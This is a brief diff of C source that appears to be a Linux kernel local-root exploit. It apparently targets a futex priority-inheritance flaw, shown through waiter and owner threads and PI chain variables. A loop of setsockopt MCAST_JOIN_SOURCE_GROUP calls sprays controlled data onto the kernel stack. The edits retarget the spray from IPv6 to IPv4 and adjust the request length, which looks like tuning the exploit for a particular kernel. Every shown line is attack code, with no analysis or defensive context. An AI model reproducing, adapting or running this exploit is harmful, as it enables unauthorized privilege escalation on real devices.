@@ -60,7 +60,7 @@ static struct gl_profile g_profile;
 #ifndef MCAST_JOIN_SOURCE_GROUP
 #define MCAST_JOIN_SOURCE_GROUP 46
 #endif
-#define GROUP_SOURCE_REQ_LEN 0x104
+#define GROUP_SOURCE_REQ_LEN 0x108
 
 static uint32_t f_wait, f_pi_target, f_pi_chain;
 static atomic_int waiter_tid, waiter_ready, waiter_waiting, owner_started;
@@ -116,7 +116,7 @@ static int prepare_stack_stamp(void) {
         proto = 0;
         break;
     }
-    stamp_sock = socket(AF_INET6, type, proto);
+    stamp_sock = socket(AF_INET, type, proto);
     if (stamp_sock < 0)
         return 0;
     dprintf(2, "[stamp] socket kind=%u fd=%d copy_depth=%#x waiter_depth=%#x delta=%d\n",
@@ -145,7 +145,7 @@ static void stamp_stack(void) {
     while (!atomic_load(&consumer_launch))
         __asm__ volatile("yield" ::: "memory");
     for (;;)
-        setsockopt(stamp_sock, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(buf));
+        setsockopt(stamp_sock, IPPROTO_IP, MCAST_JOIN_SOURCE_GROUP, buf, sizeof(buf));
 }
 
 static void *waiter_fn(void *unused) {
